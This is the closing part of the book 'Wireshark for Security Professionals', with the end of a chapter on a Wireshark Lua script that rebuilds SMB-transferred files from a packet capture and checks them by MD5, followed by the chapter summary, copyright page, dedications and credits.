<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section378" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:10.4000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SMBFileListener</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The packet callback of the listener can be seen in two parts. The first part populates <a name="_bookmark671" ></a>a dictionary (named array) of filenames with their corresponding sizes. The second part only executes when the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statements match a data transfer packet and subsequently writes the bytes that are transferred to the correct offset in a dummy file that is initialized with the character &#8220;A.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:8.1000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The reason it uses a dummy file is because chunks of the file are transferred at a time instead of a TCP stream, which would have been the case for an HTTP file transfer. A video file, for example, might be transferred out of order. Finally, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >draw</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >callback function prints the list of filenames captured and their sizes to the screen.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.8500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~/wireshark-book$ tshark -q -r smbfiletest2 \</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:223.8500pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-X lua_script:smbfilesnarf.lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >_test.txt: 256000</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To check the file contents that were reconstructed, look in the directory from where the script was run. The files should be saved there, prepended by the original path. You can compare the MD5 checksums to verify if the files are identical:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:22.5500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~/wireshark-book$ md5sum ~/Desktop/test.txt</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >_test.txt ead0aaf3ef02e9fa3b852ca1a86cea71</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >/home/jeff/Desktop/test.txt ead0aaf3ef02e9fa3b852ca1a86cea71</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >_test.txt</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:11.7000pt;margin-right:8.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Apart from the fact that this script might prove useful in the field, it is included here to give an example of how to manage protocols that</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >keep state over multiple requests, as well as to demonstrate often-used parts of the Wireshark Lua API and how to convert between data formats/types.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="252"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker465995.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section379" ><h2 style="margin-top:3.7000pt;" ><a name="_bookmark672" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Summary" ></a>Summary</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We covered a lot in this chapter. We started by introducing the Lua programming language. We discussed how it is designed to be easily integrated into other programs and covered the basics of the language. We then started to dive into the Wireshark Lua API support. We began by showing how to check your Wireshark installation for Lua support and described some of the integrated tools provided by Wireshark that relate to Lua, such as Evaluate. We then dove head first into scripting with Lua using Wireshark and TShark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><a name="_bookmark673" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We explored the Lua API through practical scripts. We started out small with counting interesting packets and re-creating an ARP cache implementation. We then delved into the more advanced features of the Lua API (and Wireshark in general) by creating a dissector for the Sample protocol. We then moved on to how to leverage your newly learned Wireshark Lua API skills to build a basic intrusion-detection functionality, and even showed how you can do advanced network file carving by extracting an SMB file from a packet capture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:5.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In closing, this chapter should have demonstrated two things. First, how easy and powerful Lua can be, especially for security professionals with any scripting experience. Second, how extensible the Wireshark GUI can be if leveraged with just a little Lua scripting. For furthering your Lua development, please consult the Lua documentation and reference manual available online for your Lua version: </span><span><a href="https://www.lua.org/docs.html" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://www.lua.org/docs.html</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Finally, as this is the final chapter, we hope this book has clearly shown Wireshark to be a valuable asset for security professionals. The virtual lab environment helps most when used alongside of the text and exercises. We encourage you to continue exploring Wireshark in the W4SP Lab. We expect to continually monitor the GitHub repository for issue resolution and script updates. Thank you.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:12.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section380" ><p class=MsoNormal  style="margin-top:4.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:101%;" ><a name="_bookmark674" ></a><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:101%;font-weight:bold;font-size:12.5000pt;" >Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:101%;font-weight:bold;font-size:9.0000pt;position:relative;top:-4.5000pt;mso-text-raise:4.5000pt;" >&#174; </span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:101%;font-weight:bold;font-size:12.5000pt;" >for Security Professionals: Using Wireshark and the Metasploit</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:101%;font-weight:bold;font-size:9.0000pt;position:relative;top:-4.5000pt;mso-text-raise:4.5000pt;" >&#174; </span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:101%;font-weight:bold;font-size:12.5000pt;" >Framework</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:101%;font-weight:bold;font-size:12.5000pt;" ><o:p></o:p></span></b></p><p class=MsoNormal  style="margin-top:6.4500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >Published by</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:6.0500pt;margin-right:316.5500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:142%;" ><span style="mso-spacerun:'yes';font-family:Georgia;line-height:142%;font-size:12.5000pt;" >John Wiley & Sons, Inc. 10475 Crosspoint Boulevard</span><span style="mso-spacerun:'yes';font-family:Georgia;line-height:142%;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.6500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >Indianapolis, IN 46256</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:6.6000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span><a href="http://www.wiley.com/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:9.5000pt;" >www.wiley.com</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:5.9500pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:147%;" ><span style="mso-spacerun:'yes';font-family:Georgia;line-height:147%;font-size:12.5000pt;" >Copyright &#169; 2017 by John Wiley & Sons, Inc., Indianapolis, Indiana Published simultaneously in Canada</span><span style="mso-spacerun:'yes';font-family:Georgia;line-height:147%;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >ISBN: 978-1-118-91821-0</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:6.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >ISBN: &nbsp;978-1-118-91823-4</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.8000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >(ebk)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:6.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >ISBN: &nbsp;978-1-118-91822-7</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.8000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >(ebk)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:6.0500pt;margin-right:9.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >No part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or by any means, electronic, mechanical, photocopying, recording, scanning or otherwise, except as permitted under Sections 107 or 108 of the 1976 United States Copyright Act, without either the prior written permission &nbsp;&nbsp;of the Publisher, or authorization through payment of the appropriate per-copy fee to the Copyright Clearance Center, 222 Rosewood Drive, &nbsp;Danvers, &nbsp;MA &nbsp;01923, (978) 750-8400, fax (978) 646-8600. Requests to the Publisher for permission should be addressed to the Permissions Department, John Wiley & Sons, Inc., 111 River</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.4000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >Street,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.5000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >Hoboken,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.5000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >NJ</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.5000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >07030,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.5000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >(201)</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.5000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >748-6011,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.5000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >fax</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.5000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >(201)</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.5000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >748-6008,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.5000pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >or</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.4500pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >online</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.4500pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >at</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:1.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span><a href="http://www.wiley.com/go/permissions" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:9.5000pt;" >http://www.wiley.com/go/permissions</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.5000pt;" >.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:5.9500pt;margin-right:17.7000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:12.5000pt;" >Limit of Liability/Disclaimer of Warranty: </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >The publisher and the author make no representations or warranties with respect to the accuracy or &nbsp;&nbsp;completeness of the contents of this work and specifically disclaim all warranties, including without limitation warranties of fitness for a particular purpose. No warranty may be created or extended by sales or promotional materials. The advice and strategies contained herein may not be suitable for every situation. This work &nbsp;&nbsp;is sold with the understanding that the publisher is not engaged in rendering legal, accounting, or other professional services. If professional assistance is required, &nbsp;&nbsp;&nbsp;the services of a competent professional person should be sought. Neither the publisher nor the author shall be liable for damages arising herefrom. The fact that an organization or Web site is referred to in this work as a citation and/or a potential source of further information does not mean that the author or the publisher endorses the information the organization or website may provide or recommendations it may make. Further, readers should be aware that Internet websites listed in this work may have changed or disappeared between when this work was written and when it is</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.2500pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >read.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:7.5000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >For general information on our other products and services please contact our</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section381" ><p class=MsoNormal  style="margin-top:4.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >Customer Care Department within the United States at (877) 762-2974, outside the United States at (317) 572-3993 or fax (317) 572-4002.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:6.1500pt;margin-right:17.5500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >Wiley publishes in a variety of print and electronic formats and by print-on- demand. Some material included with standard print versions of this book may not be included in e-books or in print-on-demand. If this book refers to media such as &nbsp;&nbsp;a CD or DVD that is not included in the version you purchased, you may download this material at </span><span><a href="http://booksupport.wiley.com/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:9.5000pt;" >http://booksupport.wiley.com</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.5000pt;" >. </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >For more information about Wiley products, visit</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.0500pt;font-size:12.5000pt;" >&nbsp;</span><span><a href="http://www.wiley.com/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:9.5000pt;" >www.wiley.com</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.5000pt;" >.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:9.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:6.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:12.5000pt;" >Library of Congress Control Number: </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >2016946245</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:6.0500pt;margin-right:15.4500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:12.5000pt;" >Trademarks: </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >Wiley and the Wiley logo are trademarks or registered trademarks &nbsp;of John Wiley & Sons, Inc. and/or its affiliates, in the United States and other countries, and may not be used without written permission. Wireshark is a registered trademark of Wireshark Foundation, Inc. Metasploit is a registered trademark of Rapid7, LLC. All other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated with any product or vendor mentioned in this</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:0.0500pt;font-size:12.5000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" >book.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section382" ><p class=MsoNormal  align=center  style="margin-top:4.2500pt;margin-right:10.5000pt;margin-left:10.6000pt;text-indent:0.0000pt;text-align:center;" ><a name="_bookmark675" ></a><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >To my loving wife Heidi, my family, friends, and all those I have had the opportunity to learn from. &#8212;Jessey</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" ><o:p>&nbsp;</o:p></span></i></p><p class=MsoNormal  align=center  style="margin-top:0.0000pt;margin-right:10.6000pt;margin-left:10.6000pt;text-indent:0.0000pt;text-align:center;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >To Mom. Thank you. &#8212;Jeff</span></i><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section383" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></i></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></i></p><h1><a name="_bookmark676" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >Credits</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoNormal  style="margin-top:15.5500pt;margin-right:312.2500pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;line-height:145%;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-weight:bold;font-size:15.0000pt;" >Project Editor </span></b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >John Sleeva </span><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-weight:bold;font-size:15.0000pt;" >Technical Editor </span></b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >Rob Shimonski </span><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-weight:bold;font-size:15.0000pt;" >Production Editor</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Athiyappan Lalith Kumar</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-left:30.5000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Copy Editor</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:7.7000pt;margin-right:293.0000pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;line-height:145%;" ><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >Kim Heusel </span><b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-weight:bold;font-size:15.0000pt;" >Production Manager </span></b><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" >Katie Wisor</span><span style="mso-spacerun:'yes';font-family:Georgia;line-height:145%;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:0.1500pt;margin-left:30.5000pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >Manager of Content Development and Assembly</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:7.7000pt;margin-right:299.6500pt;margin-left:30.5000pt;text-indent:0.0000pt;text-align:left;line-height:145%;" ><span 